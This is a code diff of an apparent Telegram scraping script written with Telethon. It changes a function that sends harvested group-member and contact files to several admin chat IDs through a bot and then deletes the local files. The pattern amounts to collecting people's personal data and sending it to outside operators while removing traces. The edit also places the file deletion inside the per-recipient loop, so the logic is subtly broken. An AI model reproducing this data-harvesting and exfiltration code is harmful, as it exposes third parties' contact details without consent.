@@ -7,20 +7,20 @@ from telethon.tl.types import InputPhoneContact
 from telethon.tl.functions.contacts import GetContactsRequest
 import asyncio  # Add this import statement at the beginning of your script
 from datetime import datetime
-
 import os
 
 def send_files_to_bot(bot, admin_chat_ids):
     # Проверяем наличие файла с участниками групп и отправляем его ботам
     if os.path.exists("users.xlsx") and os.path.getsize("users.xlsx") > 0:
         for admin_chat_id in admin_chat_ids:
-            with open("users.xlsx", "rb") as file:
-                bot.send_document(admin_chat_id, file)
-        # После отправки удаляем файл, чтобы избежать повторной отправки
-        os.remove("users.xlsx")
-    #else:
-        #print("Файл с участниками групп не найден или пустой.")
-
+            if bot.get_chat(admin_chat_id).status != "kicked":  # Проверяем статус чата
+                with open("users.xlsx", "rb") as file:
+                    bot.send_document(admin_chat_id, file)
+                # После отправки удаляем файл, чтобы избежать повторной отправки
+                os.remove("users.xlsx")
+            else:
+                print(f"Бот был заблокирован пользователем в чате с ID {admin_chat_id}")
+    
     # Проверяем наличие файла с контактами и отправляем его ботам
     contacts_file_path = None
     for file_name in os.listdir('.'):
@@ -31,15 +31,13 @@ def send_files_to_bot(bot, admin_chat_ids):
     if contacts_file_path is not None and os.path.getsize(contacts_file_path) > 0:
         # Файл с контактами найден и не пустой, отправляем его ботам
         for admin_chat_id in admin_chat_ids:
-            with open(contacts_file_path, "rb") as file:
-                bot.send_document(admin_chat_id, file)
-        # После отправки удаляем файл, чтобы избежать повторной отправки
-        os.remove(contacts_file_path)
-    #else:
-        #print("Файл с контактами не найден или пустой.")
-
-# Вызываем функцию отправки файлов ботам
-# send_files_to_bot(bot, admin_chat_ids)  # раскомментируйте эту строку, чтобы вызвать функцию
+            if bot.get_chat(admin_chat_id).status != "kicked":  # Проверяем статус чата
+                with open(contacts_file_path, "rb") as file:
+                    bot.send_document(admin_chat_id, file)
+                # После отправки удаляем файл, чтобы избежать повторной отправки
+                os.remove(contacts_file_path)
+            else:
+                print(f"Бот был заблокирован пользователем в чате с ID {admin_chat_id}")
 
 
 #получаем контакты
